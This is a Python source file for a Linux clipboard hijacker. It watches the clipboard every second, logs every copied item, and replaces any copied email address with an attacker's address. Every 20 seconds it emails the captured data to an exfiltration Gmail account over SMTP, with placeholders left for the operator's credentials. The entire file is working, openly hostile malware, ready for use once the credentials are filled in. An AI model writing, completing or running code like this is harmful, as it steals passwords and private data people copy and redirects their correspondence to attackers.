"""
Clipboard Email Hijacker with Email Exfiltration - Linux Version
"""

import re
from time import sleep, time
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import subprocess
import os

# Configuration
ATTACKER_EMAIL = "attacker@attack.com"
EXFILTRATION_EMAIL = "ADD YOURS@gmail.com"
CHECK_INTERVAL = 1  # seconds between clipboard checks
SEND_INTERVAL = 20  # seconds between sending collected data
EMAIL_REGEX = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

# Gmail SMTP Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
SMTP_USERNAME = "ADD YOURS@gmail.com"
SMTP_PASSWORD = "ADD Yours"

# Data collection storage
clipboard_data = []
hijacked_emails = []

# Detect clipboard tool
CLIPBOARD_TOOL = None
if os.system("which xclip > /dev/null 2>&1") == 0:
    CLIPBOARD_TOOL = "xclip"
elif os.system("which xsel > /dev/null 2>&1") == 0:
    CLIPBOARD_TOOL = "xsel"
elif os.system("which wl-paste > /dev/null 2>&1") == 0:
    CLIPBOARD_TOOL = "wayland"
else:
    print("[ERROR] No clipboard tool found!")
    print("[!] Install: sudo apt-get install xclip")
    sys.exit(1)

def get_clipboard_text():
    """Safely get text from clipboard"""
    try:
        if CLIPBOARD_TOOL == "xclip":
            result = subprocess.run(
                ["xclip", "-selection", "clipboard", "-o"],
                capture_output=True,
                text=True,
                timeout=2
            )
        elif CLIPBOARD_TOOL == "xsel":
            result = subprocess.run(
                ["xsel", "--clipboard", "--output"],
                capture_output=True,
                text=True,
                timeout=2
            )
        elif CLIPBOARD_TOOL == "wayland":
            result = subprocess.run(
                ["wl-paste"],
                capture_output=True,
                text=True,
                timeout=2
            )
        else:
            return None
        
        if result.returncode == 0:
            return result.stdout.rstrip()
        return None
    except:
        return None

def set_clipboard_text(text):
    """Safely set clipboard text"""
    try:
        if CLIPBOARD_TOOL == "xclip":
            process = subprocess.Popen(
                ["xclip", "-selection", "clipboard", "-i"],
                stdin=subprocess.PIPE
            )
        elif CLIPBOARD_TOOL == "xsel":
            process = subprocess.Popen(
                ["xsel", "--clipboard", "--input"],
                stdin=subprocess.PIPE
            )
        elif CLIPBOARD_TOOL == "wayland":
            process = subprocess.Popen(
                ["wl-copy"],
                stdin=subprocess.PIPE
            )
        else:
            return False
        
        process.communicate(input=text.encode('utf-8'), timeout=2)
        return process.returncode == 0
    except:
        return False

def send_exfiltration_email(clipboard_data, hijacked_emails):
    """Send collected clipboard data via email"""
    
    if not clipboard_data and not hijacked_emails:
        print("[*] No data to exfiltrate, skipping email")
        return False
    
    try:
        # Create email
        msg = MIMEMultipart()
        msg['From'] = SMTP_USERNAME
        msg['To'] = EXFILTRATION_EMAIL
        msg['Subject'] = f"Clipboard Data Exfiltration - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Build email body
        body = "="*60 + "\n"
        body += "CLIPBOARD DATA EXFILTRATION REPORT\n"
        body += "="*60 + "\n\n"
        body += f"Collection Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        body += f"Total Items Collected: {len(clipboard_data)}\n"
        body += f"Total Emails Hijacked: {len(hijacked_emails)}\n"
        body += "\n" + "="*60 + "\n"
        
        # Clipboard data section
        if clipboard_data:
            body += "\n--- CLIPBOARD DATA COLLECTED ---\n"
            body += "\nAll captured clipboard content (comma-separated):\n"
            body += ", ".join(clipboard_data)
            body += "\n\n--- DETAILED CLIPBOARD ENTRIES ---\n"
            for i, item in enumerate(clipboard_data, 1):
                body += f"{i}. {item}\n"
        
        # Hijacked emails section
        if hijacked_emails:
            body += "\n" + "="*60 + "\n"
            body += "--- HIJACKED EMAIL ADDRESSES ---\n\n"
            body += "Comma-separated list:\n"
            body += ", ".join(hijacked_emails)
            body += "\n\nDetailed list:\n"
            for i, email in enumerate(hijacked_emails, 1):
                body += f"{i}. {email}\n"
        
        body += "\n" + "="*60 + "\n"
        body += "End of Report\n"
        body += "="*60 + "\n"
        
        msg.attach(MIMEText(body, 'plain'))
        
        # Send email using SMTP_SSL
        print(f"\n[*] Sending exfiltration email to {EXFILTRATION_EMAIL}...")
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(SMTP_USERNAME, SMTP_PASSWORD)
            server.send_message(msg)
        
        print(f"[+] Successfully sent exfiltration email!")
        print(f"    - Clipboard items: {len(clipboard_data)}")
        print(f"    - Hijacked emails: {len(hijacked_emails)}\n")
        
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("[ERROR] SMTP Authentication failed!")
        print("[!] Make sure you're using a Gmail App Password, not your regular password")
        return False
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Main clipboard monitoring loop with periodic exfiltration"""
    global clipboard_data, hijacked_emails
    
    print("="*60)
    print("Clipboard Email Hijacker - Linux Version")
    print("="*60)
    print(f"[+] Clipboard tool: {CLIPBOARD_TOOL}")
    print(f"[+] Target email replacement: {ATTACKER_EMAIL}")
    print(f"[+] Exfiltration email: {EXFILTRATION_EMAIL}")
    print(f"[+] Monitoring clipboard every {CHECK_INTERVAL} second(s)")
    print(f"[+] Sending data every {SEND_INTERVAL} seconds")
    print("[+] Press Ctrl+C to stop and exit\n")
    
    hijack_count = 0
    last_hijacked = None
    last_send_time = time()
    last_clipboard_content = None
    
    try:
        while True:
            current_time = time()
            
            # Get clipboard content
            data = get_clipboard_text()
            
            # Store ALL clipboard content (not just emails)
            if data and data != last_clipboard_content:
                clipboard_data.append(data)
                last_clipboard_content = data
                print(f"[*] Clipboard captured: {data[:50]}{'...' if len(data) > 50 else ''}")
            
            # Check if it's an email and hijack it
            if data and re.search(EMAIL_REGEX, data):
                if data != ATTACKER_EMAIL and data != last_hijacked:
                    print(f"[!] EMAIL DETECTED: {data}")
                    
                    # Record the original email before hijacking
                    hijacked_emails.append(data)
                    
                    if set_clipboard_text(ATTACKER_EMAIL):
                        hijack_count += 1
                        last_hijacked = data
                        print(f"[+] REPLACED with: {ATTACKER_EMAIL}")
                        print(f"[*] Total hijacks: {hijack_count}\n")
            
            # Check if it's time to send exfiltration email
            if current_time - last_send_time >= SEND_INTERVAL:
                if send_exfiltration_email(clipboard_data, hijacked_emails):
                    # Clear the data after successful send
                    clipboard_data = []
                    hijacked_emails = []
                    print("[+] Data cleared, starting new collection cycle\n")
                
                last_send_time = current_time
            
            sleep(CHECK_INTERVAL)
    
    except KeyboardInterrupt:
        print(f"\n\n[+] Ctrl+C detected - Stopping monitoring...")
        print(f"[*] Total emails hijacked: {hijack_count}")
        
        # Send any remaining data before exit
        if clipboard_data or hijacked_emails:
            print("\n[*] Sending final exfiltration email with remaining data...")
            send_exfiltration_email(clipboard_data, hijacked_emails)
        
        print("\n[+] Program exited successfully")
        sys.exit(0)
        
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()